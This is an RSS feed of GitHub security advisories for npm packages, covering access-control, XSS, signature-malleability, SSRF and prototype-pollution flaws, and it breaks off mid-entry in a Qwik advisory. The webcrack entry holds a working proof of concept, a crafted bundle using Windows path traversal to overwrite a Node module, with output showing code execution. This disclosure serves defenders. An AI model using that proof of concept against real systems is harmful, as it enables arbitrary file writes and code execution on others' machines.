<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2024-08-20T18:01:25.683Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[directus] Improper access control in Directus]]></title>
        <id>https://github.com/advisories/GHSA-q83v-hq3j-4pq3</id>
        <link href="https://github.com/advisories/GHSA-q83v-hq3j-4pq3"/>
        <updated>2024-08-19T21:03:40.000Z</updated>
        <content type="html"><![CDATA[<p>Directus v10.13.0 allows an authenticated external attacker to modify presets created by the same user to assign them to another user. This is possible because the application only validates the user parameter in the 'POST /presets'&nbsp;request but not in the PATCH request. When chained with CVE-2024-6533, it could result in account takeover.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6534">https://nvd.nist.gov/vuln/detail/CVE-2024-6534</a></li>
<li><a href="https://directus.io">https://directus.io</a></li>
<li><a href="https://fluidattacks.com/advisories/capaldi">https://fluidattacks.com/advisories/capaldi</a></li>
<li><a href="https://github.com/advisories/GHSA-q83v-hq3j-4pq3">https://github.com/advisories/GHSA-q83v-hq3j-4pq3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q83v-hq3j-4pq3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-15T06:32:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[directus] Code injection in Directus]]></title>
        <id>https://github.com/advisories/GHSA-qf6h-p3mr-vmh5</id>
        <link href="https://github.com/advisories/GHSA-qf6h-p3mr-vmh5"/>
        <updated>2024-08-19T21:03:11.000Z</updated>
        <content type="html"><![CDATA[<p>Directus v10.13.0 allows an authenticated external attacker to execute arbitrary JavaScript on the client. This is possible because the application injects an attacker-controlled parameter that will be stored in the server and used by the client into an unsanitized DOM element. When chained with CVE-2024-6534, it could result in account takeover.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6533">https://nvd.nist.gov/vuln/detail/CVE-2024-6533</a></li>
<li><a href="https://directus.io">https://directus.io</a></li>
<li><a href="https://fluidattacks.com/advisories/bocelli">https://fluidattacks.com/advisories/bocelli</a></li>
<li><a href="https://github.com/advisories/GHSA-qf6h-p3mr-vmh5">https://github.com/advisories/GHSA-qf6h-p3mr-vmh5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qf6h-p3mr-vmh5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-15T03:30:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gettext.js] gettext.js has a Cross-site Scripting injection ]]></title>
        <id>https://github.com/advisories/GHSA-vwhg-jwr4-vxgg</id>
        <link href="https://github.com/advisories/GHSA-vwhg-jwr4-vxgg"/>
        <updated>2024-08-16T18:15:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Possible vulnerability to XSS injection if .po dictionary definition files is corrupted</p>
<h3 id="patches">Patches</h3>
<p>Update gettext.js to 2.0.3</p>
<h3 id="workarounds">Workarounds</h3>
<p>Make sure you control the origin of the definition catalog to prevent the use of this flaw in the definition of plural forms.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/guillaumepotier/gettext.js/security/advisories/GHSA-vwhg-jwr4-vxgg">https://github.com/guillaumepotier/gettext.js/security/advisories/GHSA-vwhg-jwr4-vxgg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43370">https://nvd.nist.gov/vuln/detail/CVE-2024-43370</a></li>
<li><a href="https://github.com/guillaumepotier/gettext.js/commit/8150aeba833183e14c2291a8a148b8f79d1d68d8">https://github.com/guillaumepotier/gettext.js/commit/8150aeba833183e14c2291a8a148b8f79d1d68d8</a></li>
<li><a href="https://github.com/advisories/GHSA-vwhg-jwr4-vxgg">https://github.com/advisories/GHSA-vwhg-jwr4-vxgg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vwhg-jwr4-vxgg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-15T18:06:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[elliptic] Elliptic's EDDSA missing signature length check]]></title>
        <id>https://github.com/advisories/GHSA-f7q4-pwc6-w24p</id>
        <link href="https://github.com/advisories/GHSA-f7q4-pwc6-w24p"/>
        <updated>2024-08-15T17:53:40.000Z</updated>
        <content type="html"><![CDATA[<p>In the Elliptic package 6.5.6 for Node.js, EDDSA signature malleability occurs because there is a missing signature length check, and thus zero-valued bytes can be removed or appended.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42459">https://nvd.nist.gov/vuln/detail/CVE-2024-42459</a></li>
<li><a href="https://github.com/indutny/elliptic/pull/317">https://github.com/indutny/elliptic/pull/317</a></li>
<li><a href="https://github.com/indutny/elliptic/commit/c0690b36be043ee73c1780ae4b7df48632b11cf9">https://github.com/indutny/elliptic/commit/c0690b36be043ee73c1780ae4b7df48632b11cf9</a></li>
<li><a href="https://github.com/indutny/elliptic/commit/accb61e9c1a005e5c8ff96a8b33893100bb42d11">https://github.com/indutny/elliptic/commit/accb61e9c1a005e5c8ff96a8b33893100bb42d11</a></li>
<li><a href="https://github.com/advisories/GHSA-f7q4-pwc6-w24p">https://github.com/advisories/GHSA-f7q4-pwc6-w24p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f7q4-pwc6-w24p</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-08-02T09:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[elliptic] Elliptic's ECDSA missing check for whether leading bit of r and s is zero]]></title>
        <id>https://github.com/advisories/GHSA-977x-g7h5-7qgw</id>
        <link href="https://github.com/advisories/GHSA-977x-g7h5-7qgw"/>
        <updated>2024-08-15T17:53:06.000Z</updated>
        <content type="html"><![CDATA[<p>In the Elliptic package 6.5.6 for Node.js, ECDSA signature malleability occurs because there is a missing check for whether the leading bit of r and s is zero.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42460">https://nvd.nist.gov/vuln/detail/CVE-2024-42460</a></li>
<li><a href="https://github.com/indutny/elliptic/pull/317">https://github.com/indutny/elliptic/pull/317</a></li>
<li><a href="https://github.com/indutny/elliptic/commit/b6ff1758d9a6d1a7aec177ff6df9f586492a6315">https://github.com/indutny/elliptic/commit/b6ff1758d9a6d1a7aec177ff6df9f586492a6315</a></li>
<li><a href="https://github.com/indutny/elliptic/commit/accb61e9c1a005e5c8ff96a8b33893100bb42d11">https://github.com/indutny/elliptic/commit/accb61e9c1a005e5c8ff96a8b33893100bb42d11</a></li>
<li><a href="https://github.com/advisories/GHSA-977x-g7h5-7qgw">https://github.com/advisories/GHSA-977x-g7h5-7qgw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-977x-g7h5-7qgw</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-08-02T09:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[elliptic] Elliptic allows BER-encoded signatures]]></title>
        <id>https://github.com/advisories/GHSA-49q7-c7j4-3p7m</id>
        <link href="https://github.com/advisories/GHSA-49q7-c7j4-3p7m"/>
        <updated>2024-08-15T17:52:30.000Z</updated>
        <content type="html"><![CDATA[<p>In the Elliptic package 6.5.6 for Node.js, ECDSA signature malleability occurs because BER-encoded signatures are allowed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42461">https://nvd.nist.gov/vuln/detail/CVE-2024-42461</a></li>
<li><a href="https://github.com/indutny/elliptic/pull/317">https://github.com/indutny/elliptic/pull/317</a></li>
<li><a href="https://github.com/indutny/elliptic/commit/accb61e9c1a005e5c8ff96a8b33893100bb42d11">https://github.com/indutny/elliptic/commit/accb61e9c1a005e5c8ff96a8b33893100bb42d11</a></li>
<li><a href="https://github.com/advisories/GHSA-49q7-c7j4-3p7m">https://github.com/advisories/GHSA-49q7-c7j4-3p7m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-49q7-c7j4-3p7m</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-08-02T09:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[node-ipc] node-ipc behavior change]]></title>
        <id>https://github.com/advisories/GHSA-3mpp-xfvh-qh37</id>
        <link href="https://github.com/advisories/GHSA-3mpp-xfvh-qh37"/>
        <updated>2024-08-14T22:13:15.000Z</updated>
        <content type="html"><![CDATA[<p>node-ipc starting in version 11.0.0 and prior to version 12.0.0 includes a message from the maintainer that is written to the user’s desktop. Please review the version changes before proceeding.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/RIAEvangelist/node-ipc/releases/tag/v11.0.0">https://github.com/RIAEvangelist/node-ipc/releases/tag/v11.0.0</a></li>
<li><a href="https://github.com/RIAEvangelist/node-ipc/commit/a98efaedbf090d7bf4d6bdf07761301c531608af">https://github.com/RIAEvangelist/node-ipc/commit/a98efaedbf090d7bf4d6bdf07761301c531608af</a></li>
<li><a href="https://github.com/RIAEvangelist/node-ipc/compare/10.1.0...12.0.0">https://github.com/RIAEvangelist/node-ipc/compare/10.1.0...12.0.0</a></li>
<li><a href="https://github.com/advisories/GHSA-3mpp-xfvh-qh37">https://github.com/advisories/GHSA-3mpp-xfvh-qh37</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3mpp-xfvh-qh37</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-03-16T23:54:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[trix] Trix has a cross-site Scripting vulnerability on copy & paste ]]></title>
        <id>https://github.com/advisories/GHSA-qm2q-9f3q-2vcv</id>
        <link href="https://github.com/advisories/GHSA-qm2q-9f3q-2vcv"/>
        <updated>2024-08-15T16:58:48.000Z</updated>
        <content type="html"><![CDATA[<p>The Trix editor, versions prior to 2.1.4, is vulnerable to XSS when pasting malicious code. This vulnerability is a bypass of the fix put in place for <a href="https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99">https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99</a>. In <a href="https://github.com/basecamp/trix/pull/1149">https://github.com/basecamp/trix/pull/1149</a>, we added sanitation for Trix attachments with a <code>text/html</code> content type. However, Trix only checks the content type on the paste event's <code>dataTransfer</code> object. As long as the <code>dataTransfer</code> has a content type of <code>text/html</code>, Trix parses its contents and creates an <code>Attachment</code> with them, even if the attachment itself doesn't have a <code>text/html</code> content type. Trix then uses the attachment content to set the attachment element's <code>innerHTML</code>.</p>
<h3 id="impact">Impact</h3>
<p>An attacker could trick a user to copy and paste malicious code that would execute arbitrary JavaScript code within the context of the user's session, potentially leading to unauthorized actions being performed or sensitive information being disclosed.</p>
<h3 id="patches">Patches</h3>
<p><strong>Update Recommendation:</strong> Users should upgrade to Trix editor version 2.1.4 or later, which incorporates proper sanitization of input from copied content.</p>
<h3 id="workarounds">Workarounds</h3>
<p>This is not really a workaround but something that should be considered in addition to upgrading to the patched version. If affected users can disallow browsers that don't support a Content Security Policy, then this would be an effective workaround for this and all XSS vulnerabilities. Set CSP policies such as <code>script-src 'self'</code> to ensure that only scripts hosted on the same origin are executed, and explicitly prohibit inline scripts using <code>script-src-elem</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/basecamp/trix/pull/1156">https://github.com/basecamp/trix/pull/1156</a></li>
<li><a href="https://github.com/basecamp/trix/releases/tag/v2.1.4">https://github.com/basecamp/trix/releases/tag/v2.1.4</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1149">https://github.com/basecamp/trix/pull/1149</a></li>
<li><a href="https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99">https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/DataTransfer">MDN docs for <code>DataTransfer</code></a></li>
</ul>
<h3 id="credits">Credits</h3>
<p>This vulnerability was reported by HackerOne researcher <a href="https://hackerone.com/thwin_htet?type=user">thwin_htet</a>. </p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99">https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99</a></li>
<li><a href="https://github.com/basecamp/trix/security/advisories/GHSA-qm2q-9f3q-2vcv">https://github.com/basecamp/trix/security/advisories/GHSA-qm2q-9f3q-2vcv</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1149">https://github.com/basecamp/trix/pull/1149</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1156">https://github.com/basecamp/trix/pull/1156</a></li>
<li><a href="https://github.com/basecamp/trix/commit/7656f578af0d03141a72a9d27cb3692e6947dae6">https://github.com/basecamp/trix/commit/7656f578af0d03141a72a9d27cb3692e6947dae6</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/DataTransfer">https://developer.mozilla.org/en-US/docs/Web/API/DataTransfer</a></li>
<li><a href="https://github.com/basecamp/trix/releases/tag/v2.1.4">https://github.com/basecamp/trix/releases/tag/v2.1.4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43368">https://nvd.nist.gov/vuln/detail/CVE-2024-43368</a></li>
<li><a href="https://github.com/advisories/GHSA-qm2q-9f3q-2vcv">https://github.com/advisories/GHSA-qm2q-9f3q-2vcv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qm2q-9f3q-2vcv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-14T18:11:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[webcrack] webcrack has an Arbitrary File Write Vulnerability on Windows when Parsing and Saving a Malicious Bundle]]></title>
        <id>https://github.com/advisories/GHSA-ccqh-278p-xq6w</id>
        <link href="https://github.com/advisories/GHSA-ccqh-278p-xq6w"/>
        <updated>2024-08-15T16:53:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An arbitrary file write vulnerability exists in the webcrack module when processing specifically crafted malicious code on Windows systems. This vulnerability is triggered when using the unpack bundles feature in conjunction with the saving feature. If a module name includes a path traversal sequence with Windows path separators, an attacker can exploit this to overwrite files on the host system.</p>
<h3 id="details">Details</h3>
<p>Source: <a href="https://github.com/j4k0xb/webcrack/blob/241f9469e6401f3dabc6373233d85a5e76966b54/packages/webcrack/src/unpack/bundle.ts#L79">packages/webcrack/src/unpack/bundle.ts#L79</a></p>
<pre><code class="language-ts">import { posix } from 'node:path';
import type { Module } from './module';

// eslint-disable-next-line @typescript-eslint/unbound-method
const { dirname, join, normalize } = posix;

/* ... snip ... */

const modulePath = normalize(join(path, module.path));
if (!modulePath.startsWith(path)) {
    throw new Error(`detected path traversal: ${module.path}`);
}
await mkdir(dirname(modulePath), {
    recursive: true
});
await writeFile(modulePath, module.code, 'utf8');
</code></pre>
<p>In this code, the application explicitly relies on the POSIX version of path utilities (<code>dirname</code>, <code>join</code>, <code>normalize</code>) from Node.js. However, the vulnerability arises because the POSIX version of the <code>normalize</code> function does not recognize <code>\</code> as a path separator. As a result, on Windows systems, the path traversal check fails, allowing an attacker to write files to unintended locations.</p>
<h3 id="poc">PoC</h3>
<p>The following proof of concept demonstrates how this vulnerability can be exploited to overwrite and hijack the <code>debug</code> module in Node.js:</p>
<p><strong>Malicious Script (what.js):</strong></p>
<pre><code class="language-js">(function (e) {
    var n = {};
    function o(r) {
      if (n[r]) {
        return n[r].exports;
      }
      var a = (n[r] = {
        i: r,
        l: false,
        exports: {},
      });
      e[r].call(a.exports, a, a.exports, o);
      a.l = true;
      return a.exports;
    }
    o.p = '';
    o((o.s = 386));
  })({
    './\\..\\node_modules\\debug\\src\\index': function (e, t, n) {
        module.exports = () =&gt; console.log("pwned")
    },
  });
</code></pre>
<p><strong>Webcrack Script (index.js):</strong></p>
<pre><code class="language-js">import fs from 'fs';
import { webcrack } from 'webcrack';

const input = fs.readFileSync('what.js', 'utf8');

const result = await webcrack(input);
console.log(result.code);
console.log(result.bundle);
await result.save('output-dir');
</code></pre>
<p><strong>Execution:</strong>
Running the above script with <code>node index.js</code> twice results in the following output being printed to the terminal:</p>
<pre><code>PS C:\Webcrack&gt; node .\index.js
Debugger attached.
(function (e) {
  var n = {};
  function o(r) {
    if (n[r]) {
      return n[r].exports;
    }
    var a = n[r] = {
      i: r,
      l: false,
      exports: {}
    };
    e[r].call(a.exports, a, a.exports, o);
    a.l = true;
    return a.exports;
  }
  o.p = "";
  o(o.s = 386);
})({
  "./\\..\\node_modules\\debug\\src\\index": function (e, t, n) {
    module.exports = () =&gt; console.log("pwned");
  }
});
WebpackBundle {
  type: 'webpack',
  entryId: '386',
  modules: Map(1) {
    './\\..\\node_modules\\debug\\src\\index' =&gt; WebpackModule {
      id: './\\..\\node_modules\\debug\\src\\index',
      isEntry: false,
      path: '././\\..\\node_modules\\debug\\src\\index.js',
      ast: [Object]
    }
  }
}
Waiting for the debugger to disconnect...
PS C:\Webcrack&gt; node .\index.js
Debugger attached.
pwned
pwned
pwned
pwned
pwned
pwned
pwned
Waiting for the debugger to disconnect...
file:///C:/Webcrack/node_modules/webcrack/dist/index.js:444
  if (options.log) logger(`${name}: started`);
                   ^

TypeError: logger is not a function
    at applyTransforms (file:///C:/Webcrack/node_modules/webcrack/dist/index.js:444:20)
    at Array.&lt;anonymous&gt; (file:///C:/Webcrack/node_modules/webcrack/dist/index.js:4259:7)
    at webcrack (file:///C:/Webcrack/node_modules/webcrack/dist/index.js:4292:20)
    at async file:///C:/Webcrack/index.js:6:16

Node.js v18.16.0
</code></pre>
<p>This demonstrates that the debug module was successfully overwritten and hijacked to print <code>pwned</code> to the console, confirming the arbitrary file write vulnerability has lead to code execution.</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability allows an attacker to write arbitrary <code>.js</code> files to the host system, which can be leveraged to hijack legitimate Node.js modules to gain arbitrary code execution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/j4k0xb/webcrack/security/advisories/GHSA-ccqh-278p-xq6w">https://github.com/j4k0xb/webcrack/security/advisories/GHSA-ccqh-278p-xq6w</a></li>
<li><a href="https://github.com/j4k0xb/webcrack/commit/4bc5c6f353012ee7edc2cb39d01a728ab7426999">https://github.com/j4k0xb/webcrack/commit/4bc5c6f353012ee7edc2cb39d01a728ab7426999</a></li>
<li><a href="https://github.com/j4k0xb/webcrack/blob/241f9469e6401f3dabc6373233d85a5e76966b54/packages/webcrack/src/unpack/bundle.ts#L79">https://github.com/j4k0xb/webcrack/blob/241f9469e6401f3dabc6373233d85a5e76966b54/packages/webcrack/src/unpack/bundle.ts#L79</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43373">https://nvd.nist.gov/vuln/detail/CVE-2024-43373</a></li>
<li><a href="https://github.com/advisories/GHSA-ccqh-278p-xq6w">https://github.com/advisories/GHSA-ccqh-278p-xq6w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ccqh-278p-xq6w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-14T18:01:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Server-Side Request Forgery in axios]]></title>
        <id>https://github.com/advisories/GHSA-8hc4-vh64-cxmj</id>
        <link href="https://github.com/advisories/GHSA-8hc4-vh64-cxmj"/>
        <updated>2024-08-13T19:53:25.000Z</updated>
        <content type="html"><![CDATA[<p>axios 1.7.2 allows SSRF via unexpected behavior where requests for path relative URLs get processed as protocol relative URLs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39338">https://nvd.nist.gov/vuln/detail/CVE-2024-39338</a></li>
<li><a href="https://github.com/axios/axios/releases">https://github.com/axios/axios/releases</a></li>
<li><a href="https://jeffhacks.com/advisories/2024/06/24/CVE-2024-39338.html">https://jeffhacks.com/advisories/2024/06/24/CVE-2024-39338.html</a></li>
<li><a href="https://github.com/axios/axios/issues/6463">https://github.com/axios/axios/issues/6463</a></li>
<li><a href="https://github.com/axios/axios/pull/6539">https://github.com/axios/axios/pull/6539</a></li>
<li><a href="https://github.com/axios/axios/pull/6543">https://github.com/axios/axios/pull/6543</a></li>
<li><a href="https://github.com/axios/axios/commit/6b6b605eaf73852fb2dae033f1e786155959de3a">https://github.com/axios/axios/commit/6b6b605eaf73852fb2dae033f1e786155959de3a</a></li>
<li><a href="https://github.com/axios/axios/releases/tag/v1.7.4">https://github.com/axios/axios/releases/tag/v1.7.4</a></li>
<li><a href="https://github.com/advisories/GHSA-8hc4-vh64-cxmj">https://github.com/advisories/GHSA-8hc4-vh64-cxmj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8hc4-vh64-cxmj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-12T15:30:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@bunt/app] Prototype pollution in izatop bunt]]></title>
        <id>https://github.com/advisories/GHSA-p734-xg27-8cfq</id>
        <link href="https://github.com/advisories/GHSA-p734-xg27-8cfq"/>
        <updated>2024-08-13T19:23:51.000Z</updated>
        <content type="html"><![CDATA[<p>izatop bunt v0.29.19 was discovered to contain a prototype pollution via the component /esm/qs.js. This vulnerability allows attackers to execute arbitrary code via injecting arbitrary properties.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38989">https://nvd.nist.gov/vuln/detail/CVE-2024-38989</a></li>
<li><a href="https://github.com/izatop/bunt/commit/c55201a8cee03e5282f99874dead988c80d31db7">https://github.com/izatop/bunt/commit/c55201a8cee03e5282f99874dead988c80d31db7</a></li>
<li><a href="https://gist.github.com/mestrtee/5e9830fb180a34d65f04fafb52d2b94b">https://gist.github.com/mestrtee/5e9830fb180a34d65f04fafb52d2b94b</a></li>
<li><a href="https://github.com/izatop/bunt/issues/27">https://github.com/izatop/bunt/issues/27</a></li>
<li><a href="https://github.com/advisories/GHSA-p734-xg27-8cfq">https://github.com/advisories/GHSA-p734-xg27-8cfq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p734-xg27-8cfq</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-08-12T15:30:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[quill] Cross-site Scripting in quill]]></title>
        <id>https://github.com/advisories/GHSA-4943-9vgg-gr5r</id>
        <link href="https://github.com/advisories/GHSA-4943-9vgg-gr5r"/>
        <updated>2024-08-09T14:41:51.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability in the HTML editor of Slab Quill allows an attacker to execute arbitrary JavaScript by storing an XSS payload (a crafted <code>onloadstart</code> attribute of an IMG element) in a text field. No patch exists and no further releases are planned.</p>
<p>This CVE is disputed. Researchers have claimed that this issue is not within the product itself, but is intended behavior in a web browser. More information can be found <a href="https://github.com/quilljs/quill/issues/3364">here</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3163">https://nvd.nist.gov/vuln/detail/CVE-2021-3163</a></li>
<li><a href="https://github.com/quilljs/quill/issues/3273">https://github.com/quilljs/quill/issues/3273</a></li>
<li><a href="https://github.com/quilljs/quill/issues/3359">https://github.com/quilljs/quill/issues/3359</a></li>
<li><a href="https://burninatorsec.blogspot.com/2021/04/cve-2021-3163-xss-slab-quill-js.html">https://burninatorsec.blogspot.com/2021/04/cve-2021-3163-xss-slab-quill-js.html</a></li>
<li><a href="https://quilljs.com">https://quilljs.com</a></li>
<li><a href="https://github.com/quilljs/quill/issues/3364">https://github.com/quilljs/quill/issues/3364</a></li>
<li><a href="https://github.com/advisories/GHSA-4943-9vgg-gr5r">https://github.com/advisories/GHSA-4943-9vgg-gr5r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4943-9vgg-gr5r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-05-10T15:38:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[libxmljs2] libxmljs2 vulnerable to type confusion when parsing specially crafted XML]]></title>
        <id>https://github.com/advisories/GHSA-78h3-pg4x-j8cv</id>
        <link href="https://github.com/advisories/GHSA-78h3-pg4x-j8cv"/>
        <updated>2024-08-07T20:35:44.000Z</updated>
        <content type="html"><![CDATA[<p>libxmljs2 is vulnerable to a type confusion vulnerability when parsing a specially crafted XML while invoking the <code>namespaces()</code> function (which invokes <code>XmlNode::get_local_namespaces()</code>) on a grand-child of a node that refers to an entity. This vulnerability can lead to denial of service and remote code execution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34394">https://nvd.nist.gov/vuln/detail/CVE-2024-34394</a></li>
<li><a href="https://github.com/marudor/libxmljs2/issues/205">https://github.com/marudor/libxmljs2/issues/205</a></li>
<li><a href="https://research.jfrog.com/vulnerabilities/libxmljs2-namespaces-type-confusion-rce-jfsa-2024-001034098">https://research.jfrog.com/vulnerabilities/libxmljs2-namespaces-type-confusion-rce-jfsa-2024-001034098</a></li>
<li><a href="https://github.com/advisories/GHSA-78h3-pg4x-j8cv">https://github.com/advisories/GHSA-78h3-pg4x-j8cv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-78h3-pg4x-j8cv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-02T21:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@75lb/deep-merge] @75lb/deep-merge Prototype Pollution vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-28mc-g557-92m7</id>
        <link href="https://github.com/advisories/GHSA-28mc-g557-92m7"/>
        <updated>2024-08-06T23:14:48.000Z</updated>
        <content type="html"><![CDATA[<p>Prototype Pollution in 75lb deep-merge 1.1.1 allows attackers to execute arbitrary code or cause a Denial of Service (DoS) and cause other impacts via merge methods of lodash to merge objects.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38986">https://nvd.nist.gov/vuln/detail/CVE-2024-38986</a></li>
<li><a href="https://gist.github.com/mestrtee/b20c3aee8bea16e1863933778da6e4cb">https://gist.github.com/mestrtee/b20c3aee8bea16e1863933778da6e4cb</a></li>
<li><a href="https://github.com/75lb/deep-merge/issues/1">https://github.com/75lb/deep-merge/issues/1</a></li>
<li><a href="https://github.com/75lb/deep-merge/commit/a68541fac3c2372f1ca67effad825990ad8046e1">https://github.com/75lb/deep-merge/commit/a68541fac3c2372f1ca67effad825990ad8046e1</a></li>
<li><a href="https://github.com/advisories/GHSA-28mc-g557-92m7">https://github.com/advisories/GHSA-28mc-g557-92m7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-28mc-g557-92m7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-30T21:31:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@builder.io/qwik] Qwik has a potential mXSS vulnerability due to improper HTML escaping]]></title>
        <id>https://github.com/advisories/GHSA-2rwj-7xq8-4gx4</id>
        <link href="https://github.com/advisories/GHSA-2rwj-7xq8-4gx4"/>
        <updated>2024-08-07T07:55:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A potential mXSS vulnerability exists in Qwik for versions up to 1.6.0.</p>
<h3 id="details">Details</h3>
<p>Qwik improperly escapes HTML on server-side rendering. It converts strings according to the following rules:</p>
<p><a href="https://github.com/QwikDev/qwik/blob/v1.5.5/packages/qwik/src/core/render/ssr/render-ssr.ts#L1182-L1208">https://github.com/QwikDev/qwik/blob/v1.5.5/packages/qwik/src/core/render/ssr/render-ssr.ts#L1182-L1208</a></p>
<ul>
<li>If the string is an attribute value:<ul>
<li><code>"</code> -&gt; <code>&amp;quot;</code></li>
<li><code>&amp;</code> -&gt; <code>&amp;amp;</code></li>
